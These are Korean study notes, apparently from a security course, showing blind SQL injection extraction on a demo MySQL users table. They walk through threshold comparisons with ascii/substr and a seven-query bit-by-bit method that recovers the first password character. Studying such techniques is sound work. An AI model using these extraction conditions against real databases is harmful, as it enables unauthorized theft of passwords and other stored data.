-- Blind SQL Injection 에서 사용한 substr 함수의 반환값을 비교하여 패스워드를 알아 낼 수있따.
-- 아스키에서 출력 가능한 문자의 범위는 32~126이므로 패스워드의 첫 번째 자리가 79 보다 큰 값인지 확인. 
select * from users where username='admin' and ascii(substr(password, 1, 1))>79;
+----------+----------+
| username | password |
+----------+----------+
| admin    | P@ssword |
+----------+----------+
1 row in set (0.00 sec)

-- 결과를 살펴보면, 비밀번호의 첫 번째 바이트가 P 즉 80이므로 결과가 참인 것을 확인할 수 있다.


-- ASCII는 0부터 127 범위의 문자를 표현할 수 있으며, 이는 곧 7 개의 비트를 통해 하나의 문자를 나타낼 수 있다는 것을 의미
-- 7개의 비트에 대해 1인지 비교하면 총 7번의 쿼리로 임의 데이터의 한 바이트를 알아낼 수 있다.
-- MySQL에서는 숫자를 비트 형태로 변환하는 bin 이라는 함수를 제공

SELECT bin(ord('A'));
+---------------+
| bin(ord('A')) |
+---------------+
| 1000001       |
+---------------+
1 row in set (0.00 sec)



-- 데이터 베이스에 username 이 admin , password 가 P@ssword 라고 가정하자
select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;
+----------+----------+
| username | password |
+----------+----------+
| admin    | P@ssword |
+----------+----------+
1 row in set (0.00 sec)

mysql> select * from users where username='admin' and substr(bin(ord(password)),2,1)=1;
Empty set (0.00 sec)
mysql> select * from users where username='admin' and substr(bin(ord(password)),3,1)=1;
+----------+----------+
| username | password |
+----------+----------+
| admin    | P@ssword |
+----------+----------+
1 row in set (0.01 sec)

mysql> select * from users where username='admin' and substr(bin(ord(password)),4,1)=1;
Empty set (0.00 sec)
mysql> select * from users where username='admin' and substr(bin(ord(password)),5,1)=1;
Empty set (0.00 sec)
mysql> select * from users where username='admin' and substr(bin(ord(password)),6,1)=1;
Empty set (0.00 sec)
mysql> select * from users where username='admin' and substr(bin(ord(password)),7,1)=1;
Empty set (0.00 sec)


-- 7바이트 중에 1번째와 3번째가 참이 나왔으니
-- 1010000 == 10진수로 80
-- 고로 아스키 코드 80인 P가 첫 바이트 비밀번호다.

